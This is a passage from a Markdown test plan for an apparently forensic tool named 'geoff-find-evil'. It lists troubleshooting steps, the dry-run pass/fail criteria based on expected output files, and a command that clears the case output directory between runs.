| `narrative_report.md` missing | No — must fix | Check `audit_trail.jsonl` for last event; if Manager said `flag`, report may still be generated with caveats |
| `agent_trace.jsonl` missing | No — must fix | Verify `--agent-trace` flag is supported: `geoff-find-evil --help | grep agent-trace` |

### Dry-Run Pass/Fail Decision

The dry run **passes** if:
1. Exit code is 0 (or non-zero with documented expected failure)
2. `agent_trace.jsonl` exists with ≥ 3 records
3. `findings.jsonl` exists with ≥ 1 record
4. `audit_trail.jsonl` exists with ≥ 1 record
5. `batch_critic_assessment.json` exists
6. `manager_decision.json` exists
7. At least 1 custody sidecar exists
8. `narrative_report.md` exists (content quality is secondary for dry run)

The dry run **blocks the demo recording** if any of items 1–8 fail.

### Resetting Between Dry Runs

```bash
rm -rf /tmp/geoff-dry-run/cases/
# Evidence stays; only case output is cleared
echo "Clean slate for next dry run"
```

---

*Test Plan maintained by Dan. Update pass/fail status inline as each test is run. When all tests in a Phase show PASS, mark that Phase complete in the Master Checklist.*
